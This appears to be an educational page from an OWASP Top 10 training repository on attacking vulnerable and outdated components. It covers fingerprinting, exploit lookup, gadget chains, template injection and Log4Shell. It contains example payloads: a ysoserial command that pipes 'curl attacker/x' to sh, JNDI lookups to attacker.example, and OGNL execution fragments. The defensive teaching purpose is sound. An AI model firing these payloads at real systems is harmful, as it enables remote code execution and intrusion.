# A06:2021 – Vulnerable and Outdated Components: Attack Vectors

> **⚠ EDUCATIONAL PURPOSE ONLY.** The techniques below are described so defenders understand how known-vulnerable components are found and exploited. Only test systems you own or are explicitly authorized to assess.

## Table of Contents

- [The Core Attack Flow](#the-core-attack-flow)
- [1. Version Fingerprinting from the Outside](#1-version-fingerprinting-from-the-outside)
- [2. Banner and Header Disclosure](#2-banner-and-header-disclosure)
- [3. Client-Side Library Enumeration](#3-client-side-library-enumeration)
- [4. Advisory-to-Exploit Lookup](#4-advisory-to-exploit-lookup)
- [5. Reaching a Transitive Dependency](#5-reaching-a-transitive-dependency)
- [6. Deserialization Gadget Chains](#6-deserialization-gadget-chains)
- [7. Expression-Language / Template RCE](#7-expression-language--template-rce)
- [8. Log-Message Injection (Log4Shell class)](#8-log-message-injection-log4shell-class)
- [9. End-of-Life and Unpatched Runtimes](#9-end-of-life-and-unpatched-runtimes)
- [10. Vulnerable OS Packages and Base Images](#10-vulnerable-os-packages-and-base-images)
- [11. Algorithmic and Decompression DoS](#11-algorithmic-and-decompression-dos)
- [12. Untrusted / Unofficial Component Sources](#12-untrusted--unofficial-component-sources)
- [13. N-Day Mass Scanning and Automation](#13-n-day-mass-scanning-and-automation)
- [14. Chaining a Component Flaw with Other Bugs](#14-chaining-a-component-flaw-with-other-bugs)

## The Core Attack Flow

Exploiting a vulnerable component is usually a *research-free* attack. The vulnerability, the affected versions, and often a working exploit are already public. The attacker's work reduces to two questions: **"what version are you running?"** and **"is there a public exploit for it?"**

```
1. IDENTIFY   Fingerprint the target's components and versions
                (headers, banners, JS files, error pages, favicon hashes)
                     |
2. MATCH      Look the version up in a vulnerability database
                (NVD/CVE, GitHub Advisories, exploit-db, vendor bulletins)
                     |
3. ACQUIRE    Download the public proof-of-concept or Metasploit module
                     |
4. EXPLOIT    Fire the known payload at the known-vulnerable endpoint
                     |
5. IMPACT     RCE / data theft / DoS / auth bypass -- then persist & pivot
```

Because every step is public and repeatable, attackers automate it at internet scale. The defender's only durable advantage is **closing the window** between disclosure and patch—there is no cleverness to out-think, only a clock to beat.

## 1. Version Fingerprinting from the Outside

Before matching a CVE, the attacker must learn what you run. Countless signals leak versions passively.

```
# Whatweb / wappalyzer-style fingerprinting
$ whatweb https://target.example
https://target.example [200 OK] Apache[2.4.29], PHP[7.2.24],
  jQuery[1.12.4], Bootstrap[3.3.7], WordPress[5.2.1]

# Favicon hashing pins an exact framework/appliance build
$ curl -s https://target.example/favicon.ico | md5sum
# hash -> Shodan/known-appliance lookup -> exact product & version
```

Each identified `name@version` pair is a lookup key. `jQuery 1.12.4` or `PHP 7.2.24` maps instantly to a list of known issues.

## 2. Banner and Header Disclosure

Servers and frameworks advertise themselves by default. These banners are free reconnaissance.

```
$ curl -sI https://target.example
HTTP/1.1 200 OK
Server: Apache/2.4.29 (Ubuntu)          <- exact web server + OS
X-Powered-By: PHP/7.2.24                 <- exact language runtime
X-AspNet-Version: 4.0.30319              <- exact .NET version
X-Generator: Drupal 7 (https://drupal.org)  <- exact CMS major version
```

None of these headers are needed by clients. Each one shortens the path from "a target" to "a target running a version with public CVE X."

## 3. Client-Side Library Enumeration

Front-end components are shipped *to the attacker* in every page load. Bundled and CDN-loaded JavaScript reveals exact versions, and vulnerable client libraries enable DOM XSS, prototype pollution, and more.

```html
<!-- Straight from the page source -->
<script src="/static/js/jquery-1.12.4.min.js"></script>
<script src="/static/vendor/angular-1.5.8/angular.min.js"></script>
```

```
# Automated retirement-of-JS scanning
$ retire --path ./dist
dist/js/jquery-1.12.4.min.js
 jquery 1.12.4 has known vulnerabilities: severity: medium;
   CVE: ...; summary: jQuery before 3.x cross-site scripting
```

## 4. Advisory-to-Exploit Lookup

Once a version is known, the attacker uses the *same public databases defenders use*—in reverse. The advisory tells them exactly which versions are affected and what the impact is; the fixed-version note tells them whether you have patched.

```
# Search the vulnerability databases by product/version
$ searchsploit apache struts 2.3
--------------------------------------------------------------
 Exploit Title                              |  Path
--------------------------------------------------------------
 Apache Struts 2 - Remote Code Execution    | multiple/...
--------------------------------------------------------------

# Same information from OSV / GitHub Advisories, machine-readable
$ osv-scanner --lockfile package-lock.json
| OSV URL | ECOSYSTEM | PACKAGE | VERSION | ADVISORY / FIXED |
```

The advisory is a **targeting instruction**: affected range, impact, and a link to a proof-of-concept. Weaponization is often minutes of work, not days.

## 5. Reaching a Transitive Dependency

The vulnerable code is frequently one your team never imported directly. The attacker does not care *why* it is present—only that a reachable code path leads to it.

```
# You depend on a high-level library...
"dependencies": { "some-report-generator": "^2.1.0" }

# ...which pulls a vulnerable XML/parser transitively:
$ npm ls xmldom
myapp@1.0.0
└─┬ some-report-generator@2.1.0
  └── xmldom@0.1.27   <- known-vulnerable, YOU never chose it

# Sending a report request reaches the vulnerable parser.
POST /api/reports  {"template":"<malicious-xml-payload>"}
```

## 6. Deserialization Gadget Chains

Libraries that turn untrusted bytes back into live objects are a recurring RCE source. A "gadget chain" strings together classes already present on the classpath so that the act of deserializing runs attacker-chosen code.

```java
// Vulnerable pattern: deserializing attacker-controlled data
ObjectInputStream in = new ObjectInputStream(request.getInputStream());
Object obj = in.readObject();   // gadget chain fires here
```

```
# Attacker generates a payload for the exact library version present
$ java -jar ysoserial.jar CommonsCollections1 'curl attacker/x|sh' > payload.bin
$ curl --data-binary @payload.bin https://target.example/api/import
```

The application never intended to run the payload—the vulnerable library (or a vulnerable gadget in a transitive library) provides the execution primitive.

## 7. Expression-Language / Template RCE

Frameworks that evaluate expressions or templates have repeatedly shipped flaws where attacker input reaches the evaluator. This is the mechanism behind several famous framework-RCE (Struts-class) advisories.

```
# Conceptual OGNL / expression-language style injection against a
# vulnerable framework version. The parameter is evaluated server-side:
Content-Type: %{(#cmd='id').(#execute=@java.lang.Runtime@getRuntime().exec(#cmd))...}

# Template injection when a vulnerable engine renders user input:
POST /greeting  name={{7*7}}      -> response contains 49  (evaluated!)
POST /greeting  name={{ <payload that reaches Runtime.exec> }}
```

The defender's fix is not to out-code the framework—it is to run a *patched* version where the flaw is closed.

## 8. Log-Message Injection (Log4Shell class)

The most instructive modern example: a vulnerable logging library that *interpreted* substrings inside the messages it logged. Any attacker-controlled data that eventually got logged became an execution trigger.

```
# Any field that the app logs can carry the payload:
User-Agent: ${jndi:ldap://attacker.example/x}
X-Api-Version: ${jndi:ldap://attacker.example/x}
username: ${jndi:ldap://attacker.example/x}

# Flow:
#   app logs the string -> vulnerable lib resolves ${jndi:...}
#   -> fetches remote class -> executes -> RCE
```

What made it devastating was **reach and inventory blindness**: the library was a deep transitive dependency in a vast number of products, and few operators could quickly answer "do we have it?"

## 9. End-of-Life and Unpatched Runtimes

Some components have *no* patch because the project is end-of-life. Running an unsupported runtime or framework means every future advisory is permanent.

```
# Signs of EOL software an attacker looks for:
PHP 5.6      -> unsupported; no security fixes
Python 2.7   -> end-of-life; frameworks on it are frozen
Node 10 / 12 -> past end-of-life; known runtime CVEs unpatched
AngularJS 1.x-> end-of-life; client-side flaws will never be fixed

# For EOL targets the attacker does not even need a race:
# the vulnerability is guaranteed to remain open forever.
```

## 10. Vulnerable OS Packages and Base Images

Containers freeze whatever OS packages existed when the image was built. Months later, those `openssl`, `glibc`, or `curl` versions have public CVEs—and the image is still shipping them.

```
$ trivy image myorg/webapp:1.4.2
myorg/webapp:1.4.2 (debian 10.3)
Total: 147 (CRITICAL: 12, HIGH: 41 ...)
+------------+------------------+----------+-------------------+
| LIBRARY    | VULNERABILITY ID | SEVERITY | INSTALLED VERSION |
+------------+------------------+----------+-------------------+
| openssl    | CVE-...          | CRITICAL | 1.1.1d-0          |
| libc-bin   | CVE-...          | HIGH     | 2.28-10           |
+------------+------------------+----------+-------------------+

# The app code is irrelevant; the base image is the attack surface.
```

## 11. Algorithmic and Decompression DoS

Not every component flaw is RCE. Parsers and decompressors have shipped bugs where a tiny malicious input consumes enormous CPU or memory—knocking a service over without any authentication.

```
# Regular-expression denial of service (ReDoS) in a vulnerable
# validation library: a crafted string triggers catastrophic backtracking.
input = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"   # -> CPU pegged for seconds

# "Zip bomb" / decompression bomb hitting a vulnerable archive lib:
#   a few KB on the wire expands to gigabytes in memory.
```

## 12. Untrusted / Unofficial Component Sources

Pulling components from unofficial mirrors, random forks, or unverified archives lets an attacker substitute a backdoored build. Even without a classic CVE, an untrusted *source* is a vulnerable component.

```
# Risky patterns:
pip install --index-url http://random-mirror.example/simple  somelib
curl http://unofficial-mirror/lib.jar -o lib.jar   # no signature check
git clone https://github.com/some-random-fork/popular-lib

# The fetched artifact may be modified; without a verified signature or
# checksum you cannot tell a genuine release from a tampered one.
```

## 13. N-Day Mass Scanning and Automation

Attackers do not hand-pick victims for these bugs. Within hours of a disclosure, automated scanners sweep the whole internet firing the public exploit at every host that matches the fingerprint.

```
# Disclosure timeline as the attacker experiences it:
Day 0  advisory + patched version published
Day 0  proof-of-concept appears on social media / exploit-db
Day 0-1  mass scanners updated with the new signature
Day 1+  every unpatched, internet-facing instance probed repeatedly

# "We are too small to be targeted" is meaningless here:
# the scan is indiscriminate and the marginal cost per host is ~zero.
```

## 14. Chaining a Component Flaw with Other Bugs

A component vulnerability is often the *first* link, not the whole chain. A medium-severity library flaw plus a misconfiguration or an SSRF can escalate to full compromise.

```
# Example chain:
1. SSRF in your code reaches an internal service
2. that internal service runs a vulnerable, unauthenticated component
3. the component flaw yields RCE on an internal host
4. a vulnerable OS package escalates container -> host
5. broad cloud credentials in the environment -> account takeover

# Each individual step might be "only medium" -- combined they are critical.
```

## Attacker's Perspective: Why This Category Is So Attractive

| Property | Why It Favors the Attacker |
|----------|----------------------------|
| Public vulnerability | No research needed; the flaw and fix are documented |
| Public exploit | Weaponization is download-and-run, not develop-from-scratch |
| Widespread presence | One bug in a popular library affects millions of hosts |
| Fingerprintable | Versions leak through headers, banners, and JS files |
| Slow defender patching | Quarterly patch cycles leave months of open window |
| Transitive blindness | Victims often don't know the vulnerable code is present |

## Key Takeaways

1. **The attack is inventory-vs-inventory.** Attackers match your versions to a public database; you win only by knowing your versions and patching first.
2. **Fingerprinting is free.** Suppress banners and version headers to deny the easy match—defense-in-depth, not a fix on its own.
3. **Transitive dependencies are the usual entry point.** The vulnerable code is often one nobody chose consciously.
4. **RCE classes dominate impact**—deserialization, expression/template evaluation, and log injection turn a single old library into full compromise.
5. **Speed is the whole game.** The window between disclosure and mass exploitation is measured in hours; your patch cadence must respect that.

## Next Steps

- **[Overview](./overview.md)**: Understand the category and why it ranks so high
- **[Prevention](./prevention.md)**: Inventory, scanning, and timely patching that close the window
- **[Examples](./examples.md)**: Vulnerable vs. secure dependency handling across ecosystems
- **[Hands-On Lab](./lab/outdated-library-lab/)**: Fingerprint and exploit an outdated library, then remediate it

---

*Part of the [OWASP Top 10 Educational Repository](../../README.md)*
